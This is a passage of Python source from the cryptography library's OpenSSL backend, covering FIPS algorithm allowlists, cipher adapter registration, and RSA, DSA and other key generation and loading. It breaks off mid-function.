cryptography.hazmat.backends.openssl.hashes import _HashContext\r\nfrom cryptography.hazmat.backends.openssl.hmac import _HMACContext\r\nfrom cryptography.hazmat.backends.openssl.poly1305 import (\r\n    _POLY1305_KEY_SIZE,\r\n    _Poly1305Context,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.rsa import (\r\n    _RSAPrivateKey,\r\n    _RSAPublicKey,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.x25519 import (\r\n    _X25519PrivateKey,\r\n    _X25519PublicKey,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.x448 import (\r\n    _X448PrivateKey,\r\n    _X448PublicKey,\r\n)\r\nfrom cryptography.hazmat.bindings._rust import (\r\n    x509 as rust_x509,\r\n)\r\nfrom cryptography.hazmat.bindings.openssl import binding\r\nfrom cryptography.hazmat.primitives import hashes, serialization\r\nfrom cryptography.hazmat.primitives._asymmetric import AsymmetricPadding\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    dh,\r\n    dsa,\r\n    ec,\r\n    ed25519,\r\n    ed448,\r\n    rsa,\r\n    x25519,\r\n    x448,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric.padding import (\r\n    MGF1,\r\n    OAEP,\r\n    PKCS1v15,\r\n    PSS,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric.types import (\r\n    CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES,\r\n    PRIVATE_KEY_TYPES,\r\n    PUBLIC_KEY_TYPES,\r\n)\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    BlockCipherAlgorithm,\r\n    CipherAlgorithm,\r\n)\r\nfrom cryptography.hazmat.primitives.ciphers.algorithms import (\r\n    AES,\r\n    ARC4,\r\n    Camellia,\r\n    ChaCha20,\r\n    SM4,\r\n    TripleDES,\r\n    _BlowfishInternal,\r\n    _CAST5Internal,\r\n    _IDEAInternal,\r\n    _SEEDInternal,\r\n)\r\nfrom cryptography.hazmat.primitives.ciphers.modes import (\r\n    CBC,\r\n    CFB,\r\n    CFB8,\r\n    CTR,\r\n    ECB,\r\n    GCM,\r\n    Mode,\r\n    OFB,\r\n    XTS,\r\n)\r\nfrom cryptography.hazmat.primitives.kdf import scrypt\r\nfrom cryptography.hazmat.primitives.serialization import pkcs7, ssh\r\nfrom cryptography.hazmat.primitives.serialization.pkcs12 import (\r\n    PKCS12Certificate,\r\n    PKCS12KeyAndCertificates,\r\n    _ALLOWED_PKCS12_TYPES,\r\n    _PKCS12_CAS_TYPES,\r\n)\r\n\r\n\r\n_MemoryBIO = collections.namedtuple("_MemoryBIO", ["bio", "char_ptr"])\r\n\r\n\r\n# Not actually supported, just used as a marker for some serialization tests.\r\nclass _RC2:\r\n    pass\r\n\r\n\r\nclass Backend:\r\n    """\r\n    OpenSSL API binding interfaces.\r\n    """\r\n\r\n    name = "openssl"\r\n\r\n    # FIPS has opinions about acceptable algorithms and key sizes, but the\r\n    # disallowed algorithms are still present in OpenSSL. They just error if\r\n    # you try to use them. To avoid that we allowlist the algorithms in\r\n    # FIPS 140-3. This isn\'t ideal, but FIPS 140-3 is trash so here we are.\r\n    _fips_aead = {\r\n        b"aes-128-ccm",\r\n        b"aes-192-ccm",\r\n        b"aes-256-ccm",\r\n        b"aes-128-gcm",\r\n        b"aes-192-gcm",\r\n        b"aes-256-gcm",\r\n    }\r\n    # TripleDES encryption is disallowed/deprecated throughout 2023 in\r\n    # FIPS 140-3. To keep it simple we denylist any use of TripleDES (TDEA).\r\n    _fips_ciphers = (AES,)\r\n    # Sometimes SHA1 is still permissible. That logic is contained\r\n    # within the various *_supported methods.\r\n    _fips_hashes = (\r\n        hashes.SHA224,\r\n        hashes.SHA256,\r\n        hashes.SHA384,\r\n        hashes.SHA512,\r\n        hashes.SHA512_224,\r\n        hashes.SHA512_256,\r\n        hashes.SHA3_224,\r\n        hashes.SHA3_256,\r\n        hashes.SHA3_384,\r\n        hashes.SHA3_512,\r\n        hashes.SHAKE128,\r\n        hashes.SHAKE256,\r\n    )\r\n    _fips_ecdh_curves = (\r\n        ec.SECP224R1,\r\n        ec.SECP256R1,\r\n        ec.SECP384R1,\r\n        ec.SECP521R1,\r\n    )\r\n    _fips_rsa_min_key_size = 2048\r\n    _fips_rsa_min_public_exponent = 65537\r\n    _fips_dsa_min_modulus = 1 << 2048\r\n    _fips_dh_min_key_size = 2048\r\n    _fips_dh_min_modulus = 1 << _fips_dh_min_key_size\r\n\r\n    def __init__(self):\r\n        self._binding = binding.Binding()\r\n        self._ffi = self._binding.ffi\r\n        self._lib = self._binding.lib\r\n        self._rsa_skip_check_key = False\r\n        self._fips_enabled = self._is_fips_enabled()\r\n\r\n        self._cipher_registry = {}\r\n        self._register_default_ciphers()\r\n        if self._fips_enabled and self._lib.CRYPTOGRAPHY_NEEDS_OSRANDOM_ENGINE:\r\n            warnings.warn(\r\n                "OpenSSL FIPS mode is enabled. Can\'t enable DRBG fork safety.",\r\n                UserWarning,\r\n            )\r\n        else:\r\n            self.activate_osrandom_engine()\r\n        self._dh_types = [self._lib.EVP_PKEY_DH]\r\n        if self._lib.Cryptography_HAS_EVP_PKEY_DHX:\r\n            self._dh_types.append(self._lib.EVP_PKEY_DHX)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<OpenSSLBackend(version: {}, FIPS: {})>".format(\r\n            self.openssl_version_text(), self._fips_enabled\r\n        )\r\n\r\n    def openssl_assert(\r\n        self,\r\n        ok: bool,\r\n        errors: typing.Optional[typing.List[binding._OpenSSLError]] = None,\r\n    ) -> None:\r\n        return binding._openssl_assert(self._lib, ok, errors=errors)\r\n\r\n    def _is_fips_enabled(self) -> bool:\r\n        if self._lib.Cryptography_HAS_300_FIPS:\r\n            mode = self._lib.EVP_default_properties_is_fips_enabled(\r\n                self._ffi.NULL\r\n            )\r\n        else:\r\n            mode = getattr(self._lib, "FIPS_mode", lambda: 0)()\r\n\r\n        if mode == 0:\r\n            # OpenSSL without FIPS pushes an error on the error stack\r\n            self._lib.ERR_clear_error()\r\n        return bool(mode)\r\n\r\n    def _enable_fips(self) -> None:\r\n        # This function enables FIPS mode for OpenSSL 3.0.0 on installs that\r\n        # have the FIPS provider installed properly.\r\n        self._binding._enable_fips()\r\n        assert self._is_fips_enabled()\r\n        self._fips_enabled = self._is_fips_enabled()\r\n\r\n    def activate_builtin_random(self) -> None:\r\n        if self._lib.CRYPTOGRAPHY_NEEDS_OSRANDOM_ENGINE:\r\n            # Obtain a new structural reference.\r\n            e = self._lib.ENGINE_get_default_RAND()\r\n            if e != self._ffi.NULL:\r\n                self._lib.ENGINE_unregister_RAND(e)\r\n                # Reset the RNG to use the built-in.\r\n                res = self._lib.RAND_set_rand_method(self._ffi.NULL)\r\n                self.openssl_assert(res == 1)\r\n                # decrement the structural reference from get_default_RAND\r\n                res = self._lib.ENGINE_finish(e)\r\n                self.openssl_assert(res == 1)\r\n\r\n    @contextlib.contextmanager\r\n    def _get_osurandom_engine(self):\r\n        # Fetches an engine by id and returns it. This creates a structural\r\n        # reference.\r\n        e = self._lib.ENGINE_by_id(self._lib.Cryptography_osrandom_engine_id)\r\n        self.openssl_assert(e != self._ffi.NULL)\r\n        # Initialize the engine for use. This adds a functional reference.\r\n        res = self._lib.ENGINE_init(e)\r\n        self.openssl_assert(res == 1)\r\n\r\n        try:\r\n            yield e\r\n        finally:\r\n            # Decrement the structural ref incremented by ENGINE_by_id.\r\n            res = self._lib.ENGINE_free(e)\r\n            self.openssl_assert(res == 1)\r\n            # Decrement the functional ref incremented by ENGINE_init.\r\n            res = self._lib.ENGINE_finish(e)\r\n            self.openssl_assert(res == 1)\r\n\r\n    def activate_osrandom_engine(self) -> None:\r\n        if self._lib.CRYPTOGRAPHY_NEEDS_OSRANDOM_ENGINE:\r\n            # Unregister and free the current engine.\r\n            self.activate_builtin_random()\r\n            with self._get_osurandom_engine() as e:\r\n                # Set the engine as the default RAND provider.\r\n                res = self._lib.ENGINE_set_default_RAND(e)\r\n                self.openssl_assert(res == 1)\r\n            # Reset the RNG to use the engine\r\n            res = self._lib.RAND_set_rand_method(self._ffi.NULL)\r\n            self.openssl_assert(res == 1)\r\n\r\n    def osrandom_engine_implementation(self) -> str:\r\n        buf = self._ffi.new("char[]", 64)\r\n        with self._get_osurandom_engine() as e:\r\n            res = self._lib.ENGINE_ctrl_cmd(\r\n                e, b"get_implementation", len(buf), buf, self._ffi.NULL, 0\r\n            )\r\n            self.openssl_assert(res > 0)\r\n        return self._ffi.string(buf).decode("ascii")\r\n\r\n    def openssl_version_text(self) -> str:\r\n        """\r\n        Friendly string name of the loaded OpenSSL library. This is not\r\n        necessarily the same version as it was compiled against.\r\n\r\n        Example: OpenSSL 1.1.1d  10 Sep 2019\r\n        """\r\n        return self._ffi.string(\r\n            self._lib.OpenSSL_version(self._lib.OPENSSL_VERSION)\r\n        ).decode("ascii")\r\n\r\n    def openssl_version_number(self) -> int:\r\n        return self._lib.OpenSSL_version_num()\r\n\r\n    def create_hmac_ctx(\r\n        self, key: bytes, algorithm: hashes.HashAlgorithm\r\n    ) -> _HMACContext:\r\n        return _HMACContext(self, key, algorithm)\r\n\r\n    def _evp_md_from_algorithm(self, algorithm: hashes.HashAlgorithm):\r\n        if algorithm.name == "blake2b" or algorithm.name == "blake2s":\r\n            alg = "{}{}".format(\r\n                algorithm.name, algorithm.digest_size * 8\r\n            ).encode("ascii")\r\n        else:\r\n            alg = algorithm.name.encode("ascii")\r\n\r\n        evp_md = self._lib.EVP_get_digestbyname(alg)\r\n        return evp_md\r\n\r\n    def _evp_md_non_null_from_algorithm(self, algorithm: hashes.HashAlgorithm):\r\n        evp_md = self._evp_md_from_algorithm(algorithm)\r\n        self.openssl_assert(evp_md != self._ffi.NULL)\r\n        return evp_md\r\n\r\n    def hash_supported(self, algorithm: hashes.HashAlgorithm) -> bool:\r\n        if self._fips_enabled and not isinstance(algorithm, self._fips_hashes):\r\n            return False\r\n\r\n        evp_md = self._evp_md_from_algorithm(algorithm)\r\n        return evp_md != self._ffi.NULL\r\n\r\n    def signature_hash_supported(\r\n        self, algorithm: hashes.HashAlgorithm\r\n    ) -> bool:\r\n        # Dedicated check for hashing algorithm use in message digest for\r\n        # signatures, e.g. RSA PKCS#1 v1.5 SHA1 (sha1WithRSAEncryption).\r\n        if self._fips_enabled and isinstance(algorithm, hashes.SHA1):\r\n            return False\r\n        return self.hash_supported(algorithm)\r\n\r\n    def scrypt_supported(self) -> bool:\r\n        if self._fips_enabled:\r\n            return False\r\n        else:\r\n            return self._lib.Cryptography_HAS_SCRYPT == 1\r\n\r\n    def hmac_supported(self, algorithm: hashes.HashAlgorithm) -> bool:\r\n        # FIPS mode still allows SHA1 for HMAC\r\n        if self._fips_enabled and isinstance(algorithm, hashes.SHA1):\r\n            return True\r\n\r\n        return self.hash_supported(algorithm)\r\n\r\n    def create_hash_ctx(\r\n        self, algorithm: hashes.HashAlgorithm\r\n    ) -> hashes.HashContext:\r\n        return _HashContext(self, algorithm)\r\n\r\n    def cipher_supported(self, cipher: CipherAlgorithm, mode: Mode) -> bool:\r\n        if self._fips_enabled:\r\n            # FIPS mode requires AES. TripleDES is disallowed/deprecated in\r\n            # FIPS 140-3.\r\n            if not isinstance(cipher, self._fips_ciphers):\r\n                return False\r\n\r\n        try:\r\n            adapter = self._cipher_registry[type(cipher), type(mode)]\r\n        except KeyError:\r\n            return False\r\n        evp_cipher = adapter(self, cipher, mode)\r\n        return self._ffi.NULL != evp_cipher\r\n\r\n    def register_cipher_adapter(self, cipher_cls, mode_cls, adapter):\r\n        if (cipher_cls, mode_cls) in self._cipher_registry:\r\n            raise ValueError(\r\n                "Duplicate registration for: {} {}.".format(\r\n                    cipher_cls, mode_cls\r\n                )\r\n            )\r\n        self._cipher_registry[cipher_cls, mode_cls] = adapter\r\n\r\n    def _register_default_ciphers(self) -> None:\r\n        for mode_cls in [CBC, CTR, ECB, OFB, CFB, CFB8, GCM]:\r\n            self.register_cipher_adapter(\r\n                AES,\r\n                mode_cls,\r\n                GetCipherByName("{cipher.name}-{cipher.key_size}-{mode.name}"),\r\n            )\r\n        for mode_cls in [CBC, CTR, ECB, OFB, CFB]:\r\n            self.register_cipher_adapter(\r\n                Camellia,\r\n                mode_cls,\r\n                GetCipherByName("{cipher.name}-{cipher.key_size}-{mode.name}"),\r\n            )\r\n        for mode_cls in [CBC, CFB, CFB8, OFB]:\r\n            self.register_cipher_adapter(\r\n                TripleDES, mode_cls, GetCipherByName("des-ede3-{mode.name}")\r\n            )\r\n        self.register_cipher_adapter(\r\n            TripleDES, ECB, GetCipherByName("des-ede3")\r\n        )\r\n        for mode_cls in [CBC, CFB, OFB, ECB]:\r\n            self.register_cipher_adapter(\r\n                _BlowfishInternal, mode_cls, GetCipherByName("bf-{mode.name}")\r\n            )\r\n        for mode_cls in [CBC, CFB, OFB, ECB]:\r\n            self.register_cipher_adapter(\r\n                _SEEDInternal, mode_cls, GetCipherByName("seed-{mode.name}")\r\n            )\r\n        for cipher_cls, mode_cls in itertools.product(\r\n            [_CAST5Internal, _IDEAInternal],\r\n            [CBC, OFB, CFB, ECB],\r\n        ):\r\n            self.register_cipher_adapter(\r\n                cipher_cls,\r\n                mode_cls,\r\n                GetCipherByName("{cipher.name}-{mode.name}"),\r\n            )\r\n        self.register_cipher_adapter(ARC4, type(None), GetCipherByName("rc4"))\r\n        # We don\'t actually support RC2, this is just used by some tests.\r\n        self.register_cipher_adapter(_RC2, type(None), GetCipherByName("rc2"))\r\n        self.register_cipher_adapter(\r\n            ChaCha20, type(None), GetCipherByName("chacha20")\r\n        )\r\n        self.register_cipher_adapter(AES, XTS, _get_xts_cipher)\r\n        for mode_cls in [ECB, CBC, OFB, CFB, CTR]:\r\n            self.register_cipher_adapter(\r\n                SM4, mode_cls, GetCipherByName("sm4-{mode.name}")\r\n            )\r\n\r\n    def create_symmetric_encryption_ctx(\r\n        self, cipher: CipherAlgorithm, mode: Mode\r\n    ) -> _CipherContext:\r\n        return _CipherContext(self, cipher, mode, _CipherContext._ENCRYPT)\r\n\r\n    def create_symmetric_decryption_ctx(\r\n        self, cipher: CipherAlgorithm, mode: Mode\r\n    ) -> _CipherContext:\r\n        return _CipherContext(self, cipher, mode, _CipherContext._DECRYPT)\r\n\r\n    def pbkdf2_hmac_supported(self, algorithm: hashes.HashAlgorithm) -> bool:\r\n        return self.hmac_supported(algorithm)\r\n\r\n    def derive_pbkdf2_hmac(\r\n        self,\r\n        algorithm: hashes.HashAlgorithm,\r\n        length: int,\r\n        salt: bytes,\r\n        iterations: int,\r\n        key_material: bytes,\r\n    ) -> bytes:\r\n        buf = self._ffi.new("unsigned char[]", length)\r\n        evp_md = self._evp_md_non_null_from_algorithm(algorithm)\r\n        key_material_ptr = self._ffi.from_buffer(key_material)\r\n        res = self._lib.PKCS5_PBKDF2_HMAC(\r\n            key_material_ptr,\r\n            len(key_material),\r\n            salt,\r\n            len(salt),\r\n            iterations,\r\n            evp_md,\r\n            length,\r\n            buf,\r\n        )\r\n        self.openssl_assert(res == 1)\r\n        return self._ffi.buffer(buf)[:]\r\n\r\n    def _consume_errors(self) -> typing.List[binding._OpenSSLError]:\r\n        return binding._consume_errors(self._lib)\r\n\r\n    def _consume_errors_with_text(\r\n        self,\r\n    ) -> typing.List[binding._OpenSSLErrorWithText]:\r\n        return binding._consume_errors_with_text(self._lib)\r\n\r\n    def _bn_to_int(self, bn) -> int:\r\n        assert bn != self._ffi.NULL\r\n        self.openssl_assert(not self._lib.BN_is_negative(bn))\r\n\r\n        bn_num_bytes = self._lib.BN_num_bytes(bn)\r\n        bin_ptr = self._ffi.new("unsigned char[]", bn_num_bytes)\r\n        bin_len = self._lib.BN_bn2bin(bn, bin_ptr)\r\n        # A zero length means the BN has value 0\r\n        self.openssl_assert(bin_len >= 0)\r\n        val = int.from_bytes(self._ffi.buffer(bin_ptr)[:bin_len], "big")\r\n        return val\r\n\r\n    def _int_to_bn(self, num: int, bn=None):\r\n        """\r\n        Converts a python integer to a BIGNUM. The returned BIGNUM will not\r\n        be garbage collected (to support adding them to structs that take\r\n        ownership of the object). Be sure to register it for GC if it will\r\n        be discarded after use.\r\n        """\r\n        assert bn is None or bn != self._ffi.NULL\r\n\r\n        if bn is None:\r\n            bn = self._ffi.NULL\r\n\r\n        binary = num.to_bytes(int(num.bit_length() / 8.0 + 1), "big")\r\n        bn_ptr = self._lib.BN_bin2bn(binary, len(binary), bn)\r\n        self.openssl_assert(bn_ptr != self._ffi.NULL)\r\n        return bn_ptr\r\n\r\n    def generate_rsa_private_key(\r\n        self, public_exponent: int, key_size: int\r\n    ) -> rsa.RSAPrivateKey:\r\n        rsa._verify_rsa_parameters(public_exponent, key_size)\r\n\r\n        rsa_cdata = self._lib.RSA_new()\r\n        self.openssl_assert(rsa_cdata != self._ffi.NULL)\r\n        rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n\r\n        bn = self._int_to_bn(public_exponent)\r\n        bn = self._ffi.gc(bn, self._lib.BN_free)\r\n\r\n        res = self._lib.RSA_generate_key_ex(\r\n            rsa_cdata, key_size, bn, self._ffi.NULL\r\n        )\r\n        self.openssl_assert(res == 1)\r\n        evp_pkey = self._rsa_cdata_to_evp_pkey(rsa_cdata)\r\n\r\n        return _RSAPrivateKey(\r\n            self, rsa_cdata, evp_pkey, self._rsa_skip_check_key\r\n        )\r\n\r\n    def generate_rsa_parameters_supported(\r\n        self, public_exponent: int, key_size: int\r\n    ) -> bool:\r\n        return (\r\n            public_exponent >= 3\r\n            and public_exponent & 1 != 0\r\n            and key_size >= 512\r\n        )\r\n\r\n    def load_rsa_private_numbers(\r\n        self, numbers: rsa.RSAPrivateNumbers\r\n    ) -> rsa.RSAPrivateKey:\r\n        rsa._check_private_key_components(\r\n            numbers.p,\r\n            numbers.q,\r\n            numbers.d,\r\n            numbers.dmp1,\r\n            numbers.dmq1,\r\n            numbers.iqmp,\r\n            numbers.public_numbers.e,\r\n            numbers.public_numbers.n,\r\n        )\r\n        rsa_cdata = self._lib.RSA_new()\r\n        self.openssl_assert(rsa_cdata != self._ffi.NULL)\r\n        rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n        p = self._int_to_bn(numbers.p)\r\n        q = self._int_to_bn(numbers.q)\r\n        d = self._int_to_bn(numbers.d)\r\n        dmp1 = self._int_to_bn(numbers.dmp1)\r\n        dmq1 = self._int_to_bn(numbers.dmq1)\r\n        iqmp = self._int_to_bn(numbers.iqmp)\r\n        e = self._int_to_bn(numbers.public_numbers.e)\r\n        n = self._int_to_bn(numbers.public_numbers.n)\r\n        res = self._lib.RSA_set0_factors(rsa_cdata, p, q)\r\n        self.openssl_assert(res == 1)\r\n        res = self._lib.RSA_set0_key(rsa_cdata, n, e, d)\r\n        self.openssl_assert(res == 1)\r\n        res = self._lib.RSA_set0_crt_params(rsa_cdata, dmp1, dmq1, iqmp)\r\n        self.openssl_assert(res == 1)\r\n        evp_pkey = self._rsa_cdata_to_evp_pkey(rsa_cdata)\r\n\r\n        return _RSAPrivateKey(\r\n            self, rsa_cdata, evp_pkey, self._rsa_skip_check_key\r\n        )\r\n\r\n    def load_rsa_public_numbers(\r\n        self, numbers: rsa.RSAPublicNumbers\r\n    ) -> rsa.RSAPublicKey:\r\n        rsa._check_public_key_components(numbers.e, numbers.n)\r\n        rsa_cdata = self._lib.RSA_new()\r\n        self.openssl_assert(rsa_cdata != self._ffi.NULL)\r\n        rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n        e = self._int_to_bn(numbers.e)\r\n        n = self._int_to_bn(numbers.n)\r\n        res = self._lib.RSA_set0_key(rsa_cdata, n, e, self._ffi.NULL)\r\n        self.openssl_assert(res == 1)\r\n        evp_pkey = self._rsa_cdata_to_evp_pkey(rsa_cdata)\r\n\r\n        return _RSAPublicKey(self, rsa_cdata, evp_pkey)\r\n\r\n    def _create_evp_pkey_gc(self):\r\n        evp_pkey = self._lib.EVP_PKEY_new()\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n        return evp_pkey\r\n\r\n    def _rsa_cdata_to_evp_pkey(self, rsa_cdata):\r\n        evp_pkey = self._create_evp_pkey_gc()\r\n        res = self._lib.EVP_PKEY_set1_RSA(evp_pkey, rsa_cdata)\r\n        self.openssl_assert(res == 1)\r\n        return evp_pkey\r\n\r\n    def _bytes_to_bio(self, data: bytes):\r\n        """\r\n        Return a _MemoryBIO namedtuple of (BIO, char*).\r\n\r\n        The char* is the storage for the BIO and it must stay alive until the\r\n        BIO is finished with.\r\n        """\r\n        data_ptr = self._ffi.from_buffer(data)\r\n        bio = self._lib.BIO_new_mem_buf(data_ptr, len(data))\r\n        self.openssl_assert(bio != self._ffi.NULL)\r\n\r\n        return _MemoryBIO(self._ffi.gc(bio, self._lib.BIO_free), data_ptr)\r\n\r\n    def _create_mem_bio_gc(self):\r\n        """\r\n        Creates an empty memory BIO.\r\n        """\r\n        bio_method = self._lib.BIO_s_mem()\r\n        self.openssl_assert(bio_method != self._ffi.NULL)\r\n        bio = self._lib.BIO_new(bio_method)\r\n        self.openssl_assert(bio != self._ffi.NULL)\r\n        bio = self._ffi.gc(bio, self._lib.BIO_free)\r\n        return bio\r\n\r\n    def _read_mem_bio(self, bio) -> bytes:\r\n        """\r\n        Reads a memory BIO. This only works on memory BIOs.\r\n        """\r\n        buf = self._ffi.new("char **")\r\n        buf_len = self._lib.BIO_get_mem_data(bio, buf)\r\n        self.openssl_assert(buf_len > 0)\r\n        self.openssl_assert(buf[0] != self._ffi.NULL)\r\n        bio_data = self._ffi.buffer(buf[0], buf_len)[:]\r\n        return bio_data\r\n\r\n    def _evp_pkey_to_private_key(self, evp_pkey) -> PRIVATE_KEY_TYPES:\r\n        """\r\n        Return the appropriate type of PrivateKey given an evp_pkey cdata\r\n        pointer.\r\n        """\r\n\r\n        key_type = self._lib.EVP_PKEY_id(evp_pkey)\r\n\r\n        if key_type == self._lib.EVP_PKEY_RSA:\r\n            rsa_cdata = self._lib.EVP_PKEY_get1_RSA(evp_pkey)\r\n            self.openssl_assert(rsa_cdata != self._ffi.NULL)\r\n            rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n            return _RSAPrivateKey(\r\n                self, rsa_cdata, evp_pkey, self._rsa_skip_check_key\r\n            )\r\n        elif (\r\n            key_type == self._lib.EVP_PKEY_RSA_PSS\r\n            and not self._lib.CRYPTOGRAPHY_IS_LIBRESSL\r\n            and not self._lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n            and not self._lib.CRYPTOGRAPHY_OPENSSL_LESS_THAN_111E\r\n        ):\r\n            # At the moment the way we handle RSA PSS keys is to strip the\r\n            # PSS constraints from them and treat them as normal RSA keys\r\n            # Unfortunately the RSA * itself tracks this data so we need to\r\n            # extract, serialize, and reload it without the constraints.\r\n            rsa_cdata = self._lib.EVP_PKEY_get1_RSA(evp_pkey)\r\n            self.openssl_assert(rsa_cdata != self._ffi.NULL)\r\n            rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n            bio = self._create_mem_bio_gc()\r\n            res = self._lib.i2d_RSAPrivateKey_bio(bio, rsa_cdata)\r\n            self.openssl_assert(res == 1)\r\n            return self.load_der_private_key(\r\n                self._read_mem_bio(bio), password=None\r\n            )\r\n        elif key_type == self._lib.EVP_PKEY_DSA:\r\n            dsa_cdata = self._lib.EVP_PKEY_get1_DSA(evp_pkey)\r\n            self.openssl_assert(dsa_cdata != self._ffi.NULL)\r\n            dsa_cdata = self._ffi.gc(dsa_cdata, self._lib.DSA_free)\r\n            return _DSAPrivateKey(self, dsa_cdata, evp_pkey)\r\n        elif key_type == self._lib.EVP_PKEY_EC:\r\n            ec_cdata = self._lib.EVP_PKEY_get1_EC_KEY(evp_pkey)\r\n            self.openssl_assert(ec_cdata != self._ffi.NULL)\r\n            ec_cdata = self._ffi.gc(ec_cdata, self._lib.EC_KEY_free)\r\n            return _EllipticCurvePrivateKey(self, ec_cdata, evp_pkey)\r\n        elif key_type in self._dh_types:\r\n            dh_cdata = self._lib.EVP_PKEY_get1_DH(evp_pkey)\r\n            self.openssl_assert(dh_cdata != self._ffi.NULL)\r\n            dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n            return _DHPrivateKey(self, dh_cdata, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_ED25519", None):\r\n            # EVP_PKEY_ED25519 is not present in OpenSSL < 1.1.1\r\n            return _Ed25519PrivateKey(self, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_X448", None):\r\n            # EVP_PKEY_X448 is not present in OpenSSL < 1.1.1\r\n            return _X448PrivateKey(self, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_X25519", None):\r\n            # EVP_PKEY_X25519 is not present in OpenSSL < 1.1.0\r\n            return _X25519PrivateKey(self, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_ED448", None):\r\n            # EVP_PKEY_ED448 is not present in OpenSSL < 1.1.1\r\n            return _Ed448PrivateKey(self, evp_pkey)\r\n        else:\r\n            raise UnsupportedAlgorithm("Unsupported key type.")\r\n\r\n    def _evp_pkey_to_public_key(self, evp_pkey) -> PUBLIC_KEY_TYPES:\r\n        """\r\n        Return the appropriate type of PublicKey given an evp_pkey cdata\r\n        pointer.\r\n        """\r\n\r\n        key_type = self._lib.EVP_PKEY_id(evp_pkey)\r\n\r\n        if key_type == self._lib.EVP_PKEY_RSA:\r\n            rsa_cdata = self._lib.EVP_PKEY_get1_RSA(evp_pkey)\r\n            self.openssl_assert(rsa_cdata != self._ffi.NULL)\r\n            rsa_cdata = self._ffi.gc(rsa_cdata, self._lib.RSA_free)\r\n            return _RSAPublicKey(self, rsa_cdata, evp_pkey)\r\n        elif key_type == self._lib.EVP_PKEY_DSA:\r\n            dsa_cdata = self._lib.EVP_PKEY_get1_DSA(evp_pkey)\r\n            self.openssl_assert(dsa_cdata != self._ffi.NULL)\r\n            dsa_cdata = self._ffi.gc(dsa_cdata, self._lib.DSA_free)\r\n            return _DSAPublicKey(self, dsa_cdata, evp_pkey)\r\n        elif key_type == self._lib.EVP_PKEY_EC:\r\n            ec_cdata = self._lib.EVP_PKEY_get1_EC_KEY(evp_pkey)\r\n            self.openssl_assert(ec_cdata != self._ffi.NULL)\r\n            ec_cdata = self._ffi.gc(ec_cdata, self._lib.EC_KEY_free)\r\n            return _EllipticCurvePublicKey(self, ec_cdata, evp_pkey)\r\n        elif key_type in self._dh_types:\r\n            dh_cdata = self._lib.EVP_PKEY_get1_DH(evp_pkey)\r\n            self.openssl_assert(dh_cdata != self._ffi.NULL)\r\n            dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n            return _DHPublicKey(self, dh_cdata, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_ED25519", None):\r\n            # EVP_PKEY_ED25519 is not present in OpenSSL < 1.1.1\r\n            return _Ed25519PublicKey(self, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_X448", None):\r\n            # EVP_PKEY_X448 is not present in OpenSSL < 1.1.1\r\n            return _X448PublicKey(self, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_X25519", None):\r\n            # EVP_PKEY_X25519 is not present in OpenSSL < 1.1.0\r\n            return _X25519PublicKey(self, evp_pkey)\r\n        elif key_type == getattr(self._lib, "EVP_PKEY_ED448", None):\r\n            # EVP_PKEY_X25519 is not present in OpenSSL < 1.1.1\r\n            return _Ed448PublicKey(self, evp_pkey)\r\n        else:\r\n            raise UnsupportedAlgorithm("Unsupported key type.")\r\n\r\n    def _oaep_hash_supported(self, algorithm: hashes.HashAlgorithm) -> bool:\r\n        return isinstance(\r\n            algorithm,\r\n            (\r\n                hashes.SHA1,\r\n                hashes.SHA224,\r\n                hashes.SHA256,\r\n                hashes.SHA384,\r\n                hashes.SHA512,\r\n            ),\r\n        )\r\n\r\n    def rsa_padding_supported(self, padding: AsymmetricPadding) -> bool:\r\n        if isinstance(padding, PKCS1v15):\r\n            return True\r\n        elif isinstance(padding, PSS) and isinstance(padding._mgf, MGF1):\r\n            # SHA1 is permissible in MGF1 in FIPS even when SHA1 is blocked\r\n            # as signature algorithm.\r\n            if self._fips_enabled and isinstance(\r\n                padding._mgf._algorithm, hashes.SHA1\r\n            ):\r\n                return True\r\n            else:\r\n                return self.hash_supported(padding._mgf._algorithm)\r\n        elif isinstance(padding, OAEP) and isinstance(padding._mgf, MGF1):\r\n            return self._oaep_hash_supported(\r\n                padding._mgf._algorithm\r\n            ) and self._oaep_hash_supported(padding._algorithm)\r\n        else:\r\n            return False\r\n\r\n    def generate_dsa_parameters(self, key_size: int) -> dsa.DSAParameters:\r\n        if key_size not in (1024, 2048, 3072, 4096):\r\n            raise ValueError(\r\n                "Key size must be 1024, 2048, 3072, or 4096 bits."\r\n            )\r\n\r\n        ctx = self._lib.DSA_new()\r\n        self.openssl_assert(ctx != self._ffi.NULL)\r\n        ctx = self._ffi.gc(ctx, self._lib.DSA_free)\r\n\r\n        res = self._lib.DSA_generate_parameters_ex(\r\n            ctx,\r\n            key_size,\r\n            self._ffi.NULL,\r\n            0,\r\n            self._ffi.NULL,\r\n            self._ffi.NULL,\r\n            self._ffi.NULL,\r\n        )\r\n\r\n        self.openssl_assert(res == 1)\r\n\r\n        return _DSAParameters(self, ctx)\r\n\r\n    def generate_dsa_private_key(\r\n        self, parameters: dsa.DSAParameters\r\n    ) -> dsa.DSAPrivateKey:\r\n        ctx = 